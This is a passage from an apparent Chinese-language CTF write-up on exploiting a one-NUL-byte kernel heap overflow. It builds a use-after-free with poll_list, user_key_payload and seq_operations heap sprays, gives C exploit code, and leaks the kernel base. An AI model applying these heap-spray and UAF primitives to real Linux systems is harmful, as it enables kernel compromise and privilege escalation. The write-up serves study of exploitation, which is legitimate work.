<p><img src="http://imgsrc.baidu.com/forum/pic/item/3c6d55fbb2fb43161c6ecf4e66a4462309f7d395.jpg" srcset="/img/loading.gif" lazyload></p>
<h1 id="0x02-poll-list基础"><a href="#0x02-poll-list基础" class="headerlink" title="0x02 poll_list基础"></a>0x02 poll_list基础</h1><p>首先查看man手册</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">DESCRIPTION<br>       poll()  performs  a  <span class="hljs-keyword">similar</span> task <span class="hljs-keyword">to</span> <span class="hljs-keyword">select</span>(<span class="hljs-number">2</span>): it waits <span class="hljs-keyword">for</span> one <span class="hljs-keyword">of</span> a <span class="hljs-keyword">set</span> <span class="hljs-keyword">of</span> file descriptors <span class="hljs-keyword">to</span> become ready <span class="hljs-keyword">to</span> <span class="hljs-keyword">perform</span> I/O.  The Linux-specific epoll(<span class="hljs-number">7</span>) API performs a <span class="hljs-keyword">similar</span> task, but offers features beyond those<br>       <span class="hljs-built_in">found</span> <span class="hljs-keyword">in</span> poll().<br><br></code></pre></td></tr></table></figure>

<p>该poll系统调用是用来检测一组文件描述符的活动，当我们每次调用 <code>poll()</code>系统调用时，内核空间将会分配一个 <code>poll_list</code>结构体对象</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">poll</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> pollfd *fds, <span class="hljs-type">nfds_t</span> nfds, <span class="hljs-type">int</span> timeout)</span></span>;<br></code></pre></td></tr></table></figure>

<p>其中传递了三个参数</p>
<ol>
<li><code>fds</code>: <code>pollfd</code>类型的一个数组</li>
<li><code>nfds</code>:前面的参数<code>fds</code>中条目的个数</li>
<li><code>timeout</code>:事件发生的毫秒数</li>
</ol>
<p>下面是相关的数据结构</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">struct</span> <span class="hljs-title class_">pollfd</span> &#123;<br>	<span class="hljs-type">int</span> fd;<br>	<span class="hljs-type">short</span> <span class="hljs-type">int</span> events;<br>	<span class="hljs-type">short</span> <span class="hljs-type">int</span> revents;<br>&#125;;<br><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">poll_list</span> &#123;<br>	<span class="hljs-keyword">struct</span> <span class="hljs-title class_">poll_list</span> *next;<br>	<span class="hljs-type">int</span> len;<br>	<span class="hljs-keyword">struct</span> <span class="hljs-title class_">pollfd</span> entries[];<br>&#125;;<br></code></pre></td></tr></table></figure>

<p>那么我们该如何分配一个 <code>poll_list</code>对象呢，</p>
<p>当我们调用 <code>poll()</code>系统调用，这里会调用到 <code>do_sys_poll()</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">do_sys_poll</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> pollfd __user *ufds, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> nfds,</span><br><span class="hljs-params">		<span class="hljs-keyword">struct</span> timespec64 *end_time)</span><br>&#123;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">poll_wqueues</span> <span class="hljs-title">table</span>;</span><br>	<span class="hljs-type">int</span> err = -EFAULT, fdcount, len;<br>	<span class="hljs-comment">/* Allocate small arguments on the stack to save memory and be</span><br><span class="hljs-comment">	   faster - use long to make sure the buffer is aligned properly</span><br><span class="hljs-comment">	   on 64 bit archs to avoid unaligned access */</span><br>	<span class="hljs-type">long</span> stack_pps[POLL_STACK_ALLOC/<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">long</span>)];<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">poll_list</span> *<span class="hljs-title">const</span> <span class="hljs-title">head</span> =</span> (<span class="hljs-keyword">struct</span> poll_list *)stack_pps;<br> 	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">poll_list</span> *<span class="hljs-title">walk</span> =</span> head;<br> 	<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> todo = nfds;<br><br>	<span class="hljs-keyword">if</span> (nfds &gt; rlimit(RLIMIT_NOFILE))<br>		<span class="hljs-keyword">return</span> -EINVAL;<br><br>	len = <span class="hljs-type">min_t</span>(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>, nfds, N_STACK_PPS);<br>	<span class="hljs-keyword">for</span> (;;) &#123;<br>		walk-&gt;next = <span class="hljs-literal">NULL</span>;<br>		walk-&gt;len = len;<br>		<span class="hljs-keyword">if</span> (!len)<br>			<span class="hljs-keyword">break</span>;<br><br>		<span class="hljs-keyword">if</span> (copy_from_user(walk-&gt;entries, ufds + nfds-todo,<br>					<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> pollfd) * walk-&gt;len))<br>			<span class="hljs-keyword">goto</span> out_fds;<br><br>		todo -= walk-&gt;len;<br>		<span class="hljs-keyword">if</span> (!todo)<br>			<span class="hljs-keyword">break</span>;<br><br>		len = min(todo, POLLFD_PER_PAGE);<br>		walk = walk-&gt;next = kmalloc(struct_size(walk, entries, len),<br>					    GFP_KERNEL);<br>		<span class="hljs-keyword">if</span> (!walk) &#123;<br>			err = -ENOMEM;<br>			<span class="hljs-keyword">goto</span> out_fds;<br>		&#125;<br>	&#125;<br><br>	......<br></code></pre></td></tr></table></figure>

<p>代码首先是在栈空间当中创建了一个256字节大小的缓冲区，其中能存放 30个 <code>struct pollfd</code>和1个 <code>struct poll_list</code>，如果说我们所需要传入的 <code>pollfd</code>大于30个的话，那么多余的部分将会保存在内核堆上，如果我们精确计算传入的 <code>pollfd</code>个数，那么我们可以分配的范围达到 <code>kmalloc-32 ~ kmalloc-4k</code>之大，也就是说如果我们传入了540个文件描述符的化，他在内核内存空间中的分配会按照下面的分配模式</p>
<p><code>内核栈30个 + 内核堆510个</code></p>
<p>该内核堆是从 <code>kmalloc-4k</code>获取，然而如果说我们传入了超过542个文件描述符呢，它同样会开辟适当的内核堆空间进行分配，这里我们做个比方，如果说我们传入542个文件描述符，他的分配情况会如下：</p>
<p><img src="http://imgsrc.baidu.com/forum/pic/item/f3d3572c11dfa9ecebdce12324d0f703918fc110.jpg" srcset="/img/loading.gif" lazyload></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs do_sys_poll">	....<br>	poll_initwait(&amp;table);<br>	fdcount = do_poll(head, &amp;table, end_time);<br>	poll_freewait(&amp;table);<br> 	<br> 	....<br><br>out_fds:<br>	walk = head-&gt;next;<br>	while (walk) &#123;<br>		struct poll_list *pos = walk;<br>		walk = walk-&gt;next;<br>		kfree(pos);<br>	&#125;<br><br>	....<br>&#125;<br></code></pre></td></tr></table></figure>

<p>在我们将所有传入的 <code>poll_list</code>复制到内核空间之后，调用 <code>do_poll()</code>函数来监视我们提供的文件描述符，直到发生特定事件或者计时器到期，这里的 <code>end_time</code>就是我们 <code>poll</code>系统调用 所传入的第三个参数，也就是说只要我们愿意，该 <code>poll_list</code>内存块可以在内核中长期存在。</p>
<p>在 <code>do_poll()</code>函数调用完毕后，他将会接着调用 <code>poll_freewait()</code>函数来进行阻塞，直到发生事件或者计时器到期，在此之后会进行状态的写入，然后在 while 循环中释放我们的 <code>poll_list</code>，而这里如果 <code>walk-&gt;next</code>不为空的化，那么该kfree将会持续，所以<strong>我们这里要么是合法object，要么是NULL</strong></p>
<p>由于调用 <code>poll</code>系统调用会阻塞自身，因此我们尝试使用线程来帮助我们完成这一工作 :)</p>
<p>这里可以写一个通用的模板来方便我们使用</p>
<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;poll.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> N_STACK_PPS 240</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> POLL_LIST_SIZE 16</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> POLLFD_SIZE 8;</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PAGE_SIZE 4096</span><br><br><span class="hljs-type">pthread_mutex_t</span> mutex = PTHREAD_MUTEX_INITIALIZER;<br><span class="hljs-type">int</span> poll_tid[<span class="hljs-number">0x1000</span>];<br><span class="hljs-type">int</span> fds[<span class="hljs-number">0x100</span>];  <span class="hljs-comment">//monitor target fd</span><br><span class="hljs-type">int</span> poll_threads;<br><br><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">poll_args</span>&#123;<br>    <span class="hljs-type">int</span> t_id;           <span class="hljs-comment">//thread_id</span><br>    <span class="hljs-type">int</span> size;           <span class="hljs-comment">//the size you want to allocated</span><br>    <span class="hljs-type">int</span> timeout;<br>&#125;;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">alloc_poll_list</span><span class="hljs-params">(<span class="hljs-type">void</span> *args)</span></span>&#123;<br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">pollfd</span> *pfds;<br>    <span class="hljs-type">int</span> id, want_size, timeout, nfds;<br>    id = ((<span class="hljs-keyword">struct</span> poll_args *)args)-&gt;t_id;<br>    want_size = ((<span class="hljs-keyword">struct</span> poll_args *)args)-&gt;size;<br>    timeout = ((<span class="hljs-keyword">struct</span> poll_args *)args)-&gt;timeout;<br>    <br>    <span class="hljs-comment">/* nfds need modify :) */</span><br>    want_size = want_size - ((want_size/PAGE_SIZE)+<span class="hljs-number">1</span>)*POLL_LIST_SIZE;<br>    nfds = (N_STACK_PPS + want_size)/POLLFD_SIZE;<br>    <br>    pfds = <span class="hljs-built_in">calloc</span>(nfds, <span class="hljs-built_in">sizeof</span>(<span class="hljs-keyword">struct</span> pollfd));<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; nfds; i++)&#123;<br>        pfds[<span class="hljs-number">0</span>].fd = fds[<span class="hljs-number">0</span>];<br>        pfds[<span class="hljs-number">0</span>].events = POLLERR;<br>    &#125;<br><br>    <span class="hljs-built_in">pthread_mutex_lock</span>(&amp;mutex);<br>    poll_threads++;<br>    <span class="hljs-built_in">pthread_mutex_unlock</span>(&amp;mutex);<br>    <br>    <span class="hljs-built_in">poll</span>(pfds, nfds, timeout);<br><br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">create_poll_thread</span><span class="hljs-params">(<span class="hljs-type">int</span> id, <span class="hljs-type">size_t</span> size, <span class="hljs-type">int</span> timeout)</span></span>&#123;<br>    <span class="hljs-keyword">if</span>(id &lt; <span class="hljs-number">0</span> || size &lt; <span class="hljs-number">0</span> || timeout &lt; <span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x]create_poll_thread: Wrong argument!&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>    <br>    <span class="hljs-comment">/* Include the poll_list head */</span><br>    <span class="hljs-keyword">if</span>(!(size%PAGE_SIZE == <span class="hljs-number">0</span> || size%PAGE_SIZE &lt; <span class="hljs-number">0x10</span>))&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x]create_poll_thread: size you want have to be suitable!&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">poll_args</span> *args;<br>    args = <span class="hljs-built_in">calloc</span>(<span class="hljs-number">1</span>, <span class="hljs-built_in">sizeof</span>(<span class="hljs-keyword">struct</span> poll_args));<br>    args-&gt;t_id = id;<br>    args-&gt;size = size;<br>    args-&gt;timeout = timeout;<br>    <span class="hljs-built_in">pthread_create</span>((<span class="hljs-type">void</span> *)&amp;poll_tid[id], <span class="hljs-number">0</span>, (<span class="hljs-type">void</span> *)alloc_poll_list, (<span class="hljs-type">void</span> *)args); <br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">join_poll_threads</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; poll_threads; i++ )&#123;<br>        <span class="hljs-built_in">pthread_join</span>(poll_tid[i], <span class="hljs-literal">NULL</span>);<br>    &#125;<br>    poll_threads = <span class="hljs-number">0</span>;<br>&#125;<br><br><br>[...]<br><br>    fds[<span class="hljs-number">0</span>] = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/etc/passwd&quot;</span>, O_RDONLY);<br>    <span class="hljs-built_in">create_poll_thread</span>(<span class="hljs-number">0</span>, <span class="hljs-number">4096</span> + <span class="hljs-number">4096</span> + <span class="hljs-number">32</span>, <span class="hljs-number">3000</span>);<br>    <span class="hljs-built_in">join_poll_threads</span>();<br><br>[...]<br><br></code></pre></td></tr></table></figure>

<h1 id="0x03-漏洞利用"><a href="#0x03-漏洞利用" class="headerlink" title="0x03 漏洞利用"></a>0x03 漏洞利用</h1><h2 id="大致思路"><a href="#大致思路" class="headerlink" title="大致思路"></a>大致思路</h2><p>仅仅一个NULL字节的溢出能够给我带来什么呢，我们想到最容易利用的就是指针了，如果说我们零字节可以覆盖一个结构体的第一个字节，并且该结构体的第一个字段为一个指针的化，那么我们就完成了一个指针的重定向，但是我们怎么能保证 <code>0xdeadbeef</code>和 <code>0xdeadbe00</code>都是合法指针且能为我们所用呢？</p>
<p>不必惊慌，堆喷会为我们解决这一切。</p>
<p>我们都知道，分配出来的slab都是以一个page为单位的，并且我们可以找到许多结构体，他们的大小可以被0x100所整除，例如 <code>seq_operation</code>、 它的地址末一字节只有可能有以下几种情况 <code>0x00、0x20、0x40、0x60、0x80、0xa0、0xc0、0xe0</code>,因此如果说我们可以堆喷这样的一类结构体，然后将其中某个结构体的低一子节覆盖为 <code>\x00</code>，那么就会造成两个指针指向同一块地址的情况</p>
<p><img src="http://imgsrc.baidu.com/forum/pic/item/562c11dfa9ec8a132ffdfad4b103918fa0ecc01b.jpg" srcset="/img/loading.gif" lazyload></p>
<p>知道了这个利用技巧，那么我们就来构造环境。</p>
<p>我们第一步首先是要选则恰当的结构体，上面举出的简单例子是0x20大小的结构体，恰好可以作为我们的目标，但是这还不够，还记得上面说到的在释放 <code>poll_list</code>的过程当中，如果 <code>walk-&gt;next</code>指针不为空，则会一直释放下去的事情吗，因此如果说我们的该结构体首8字节不为 <code>NULL</code>的化，那么很有可能在释放 <code>poll_list</code>的过程当中访问到非法地址导致panic，因此这里我们选择一个弹性大小的 <code>user_key_payload</code>结构体，他的首字段 <code>user_key_payload.rcu</code>在分配初期并不会进行初始化，很适合我们使用。</p>
<p>但虽说不会初始化，但难保其中不存有原先便存在的值，所以在堆喷 <code>user_key_payload</code>之前我们需要先用0将object的内容进行覆盖，出题者所给出的解决方案就是在 <code>add_key</code>之前使用 <code>setxattr</code>系统调用来首先分配出一个object然后覆盖其中的值为0，然后由于setxattr系统调用的特性，在结束后会自动将刚才申请的堆块进行释放，然后使得该堆块被分配为  <code>user_key_payload</code></p>
<h2 id="具体过程"><a href="#具体过程" class="headerlink" title="具体过程"></a>具体过程</h2><h3 id="1-前期准备"><a href="#1-前期准备" class="headerlink" title="1.前期准备"></a>1.前期准备</h3><p>首先我们需要利用程序当中模块的漏洞，由于在上面的大致思路已经讲解，我们首先堆喷 <code>seq_operations</code>结构体，将我们 kmalloc-32的slab进行清洗，清洗完成后就可以开始堆喷我们的 <code>victim struct</code>，也就是 <code>user_key_payload</code>，此时现存的slab大致如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; SEQ_SPRAY_NR; i++)&#123;<br>    seq_id[i] = alloc_seq_op();<br>    <span class="hljs-keyword">if</span>(seq_id[i] &lt; <span class="hljs-number">0</span>)&#123;<br>        error_log(<span class="hljs-string">&quot;Allocate the seq_operations failed&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>这里我可以确定其开启了 <code>CONFIG_FREELIST_RANDOM</code>和 <code>CONFIG_FREELIST_HARDENED</code>两个配置，具体可以在调试过程当中发现</p>
<p><img src="http://imgsrc.baidu.com/forum/pic/item/ac6eddc451da81cb9d4559f91466d01609243167.jpg" srcset="/img/loading.gif" lazyload></p>
<p>上面图片截自部分kmalloc-32slab，我们可以看到其中的object有一部分是包含了四个内核地址，这个就是 <code>seq_operations</code>，其他的就是空闲的object，我们可以发现空闲object的next指针是位于0x10偏移处，并且是个很奇怪的值，因此推断肯定是开启了随机值异或的配置:)</p>
<p><img src="http://imgsrc.baidu.com/forum/pic/item/71cf3bc79f3df8dc5c7655a58b11728b471028bf.jpg" srcset="/img/loading.gif" lazyload></p>
<p>因此这样更方便我们之后堆喷user_key_payload，当然在堆喷期间我们需要开启线程堆喷我们的 <code>poll_list</code>，这里需要堆喷的大小为 <code>4096+32</code>,这里注意我们使用到了 <code>setxattr</code>来首先将前8字节清空，具体原因在上面已经讲解， 如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">72</span>; i++)&#123;<br>      setxattr(<span class="hljs-string">&quot;/home/user/.bashrc&quot;</span>, <span class="hljs-string">&quot;user.x&quot;</span>, data, <span class="hljs-number">32</span>, XATTR_CREATE);<br>      <span class="hljs-built_in">sprintf</span>(description, <span class="hljs-string">&quot;payload_%d&quot;</span>, i);<br>      <span class="hljs-built_in">memset</span>(buff, i, <span class="hljs-keyword">sizeof</span>(buff));<br>      key_id[i] = key_alloc(description, buff, <span class="hljs-number">0x8</span>);<br>      <span class="hljs-keyword">if</span>(key_id[i] &lt; <span class="hljs-number">0</span>)&#123;<br>          <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[X]key index %d id is %d\n&quot;</span>, i,key_id[i]);<br>          error_log(<span class="hljs-string">&quot;key alloc failed!&quot;</span>);<br>      &#125;<br>  &#125; <br><br>  info_log(<span class="hljs-string">&quot;Step IV: Spraying the poll_list in type 4096+32...&quot;</span>);<br>  bind_core(<span class="hljs-number">1</span>);<br>  <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">14</span>; i++)&#123;<br>      create_poll_thread(i, <span class="hljs-number">4096</span>+<span class="hljs-number">32</span>, <span class="hljs-number">3000</span>, <span class="hljs-number">0</span>);<br>  &#125;<br>  bind_core(<span class="hljs-number">0</span>);<br>  <span class="hljs-keyword">while</span>(poll_threads != <span class="hljs-number">14</span>)&#123;&#125;;<br><br>  sleep(<span class="hljs-number">1</span>);<br>  info_log(<span class="hljs-string">&quot;Step V: Spraying remain of the 0x20 user_key_payload...&quot;</span>);<br>  <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">72</span>; i &lt; USER_KEY_PAYLOAD_SPRAY_NR; i++)&#123;<br>      setxattr(<span class="hljs-string">&quot;/home/user/.bashrc&quot;</span>, <span class="hljs-string">&quot;user.x&quot;</span>, data, <span class="hljs-number">32</span>, XATTR_CREATE);<br>      <span class="hljs-built_in">sprintf</span>(description, <span class="hljs-string">&quot;payload_%d&quot;</span>, i);<br>      <span class="hljs-built_in">memset</span>(buff, i, <span class="hljs-keyword">sizeof</span>(buff));<br>      key_id[i] = key_alloc(description, buff, <span class="hljs-number">0x8</span>);<br>      <span class="hljs-keyword">if</span>(key_id[i] &lt; <span class="hljs-number">0</span>)&#123;<br>          <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[X]key index %d id is %d\n&quot;</span>, i,key_id[i]);<br>          error_log(<span class="hljs-string">&quot;key alloc failed!&quot;</span>);<br>      &#125;<br>  &#125;  <br><br></code></pre></td></tr></table></figure>

<p><img src="http://imgsrc.baidu.com/forum/pic/item/f7246b600c338744fe4ef548170fd9f9d72aa07f.jpg" srcset="/img/loading.gif" lazyload></p>
<h3 id="2-漏洞利用"><a href="#2-漏洞利用" class="headerlink" title="2.漏洞利用"></a>2.漏洞利用</h3><p>构造成上述环境后我们就可以利用我们的漏洞模块，设置size为4096就可以造成一个零字节溢出，如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">info_log(<span class="hljs-string">&quot;Step VI: Insert the proc_rw/cormons&#x27;s 4096 object and free random one user_key_payload..&quot;</span>);<br>write(proc_fd, data, <span class="hljs-number">4096</span>); <br>join_poll_threads();<br><br></code></pre></td></tr></table></figure>

<p><img src="http://imgsrc.baidu.com/forum/pic/item/e61190ef76c6a7ef99c97212bbfaaf51f3de6613.jpg" srcset="/img/loading.gif" lazyload></p>
<p>我们也可以通过调试来看看，首先可以查看一下漏洞模块分配到的kmalloc-4k的块</p>
<p><img src="http://imgsrc.baidu.com/forum/pic/item/8d5494eef01f3a294c110ffadf25bc315c607c2d.jpg" srcset="/img/loading.gif" lazyload></p>
<p>其中rax就是我们分配到的4k块，此时仅仅是才分配还没有进行溢出操作，因此我们又接着看了它相邻的4k块，好的，接下来我们执行完 <code>cormon_proc_write</code>函数，查看溢出后的效果</p>
<p><img src="http://imgsrc.baidu.com/forum/pic/item/8d5494eef01f3a294c190ffadf25bc315c607c35.jpg" srcset="/img/loading.gif" lazyload></p>
<p>可以看到确实将相邻 <code>poll_list-&gt;next</code>指针的低一字节覆盖为0，然后我们查看其中目标发现确实是我们的序号为0x8e的 <code>user_key_payload</code></p>
<p>什么?你说如果碰巧指向了 <code>seq_operations</code>或者 其他的<code>poll_list</code>是不是很难办.</p>
<p>难办?难办那就别办咯!（掀桌）</p>
<p><img src="https://th.bing.com/th/id/OIP.tNINfo_Ks7Hur_SWO-3ieAHaFi?pid=ImgDet&rs=1" srcset="/img/loading.gif" lazyload></p>
<p>实际上我们堆喷的大部分仍然是user_key_payload，因此出现这种情况并不是很多，若出现了那只能说是一边承认自己脸黑一边重开了(</p>
<h3 id="3-地址泄露"><a href="#3-地址泄露" class="headerlink" title="3.地址泄露"></a>3.地址泄露</h3><p>好的接下来我们获得了内核当中两个指针分别都指向一个 <code>user_key_payload</code>,此时我们只需要等带 <code>poll_list</code>超时自动释放链条上的所有堆块，这里肯定会将该 <code>victim user_key_payload</code>释放，这样就构造出来UAF供我们使用，此时我们再堆喷 <code>seq_operations</code>来获取它</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c">info_log(<span class="hljs-string">&quot;Step VII: Construct UAF by seq_operations...&quot;</span>);<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = SEQ_SPRAY_NR; i &lt; SEQ_SPRAY_NR + <span class="hljs-number">128</span>; i++)&#123;<br>    seq_id[i] = alloc_seq_op();<br>    <span class="hljs-keyword">if</span>(seq_id[i] &lt; <span class="hljs-number">0</span>)&#123;<br>        error_log(<span class="hljs-string">&quot;Allocate the seq_operations failed&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p><img src="http://imgsrc.baidu.com/forum/pic/item/8d5494eef01f3a294ded10fadf25bc315c607cd9.jpg" srcset="/img/loading.gif" lazyload></p>
<p>红色堆块是我们堆喷之后 <code>user_key_payload</code>和 <code>seq_operations</code>同时指向的堆块，此时我们依次读取所有的 <code>user_key_payload</code>，如果读取内容大于最开始分配的8字节则说明找到了该victim，这里又知道 <code>seq_operations</code>结构体偏移0x18处初始化应该为 <code>proc_single_show</code>，他是一个内核全局函数，因此我们可以借此泄露出内核的基地址:)</p>
<p>但是光泄露出基地址还远远不够，我们仍需要内核堆上的地址才能进行完整的利用,要泄露堆地址我们可以通过 <code>tty_struct</code>结构体来进行，这里存在一个技巧，那就是创建 <code>struct tty_struct</code>的时候会额外创建一个32字节大小的结构体 <code>tty_file_private</code></p>
<figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><span class="hljs-keyword">struct</span> <span class="hljs-type">tty_file_private</span> &#123;<br>	<span class="hljs-keyword">struct</span> <span class="hljs-type">tty_struct</span> *tty;<br>	<span class="hljs-keyword">struct</span> <span class="hljs-type">file</span> *file;<br>	<span class="hljs-keyword">struct</span> <span class="hljs-type">list_head</span> list;<br>&#125;;<br></code></pre></td></tr></table></figure>

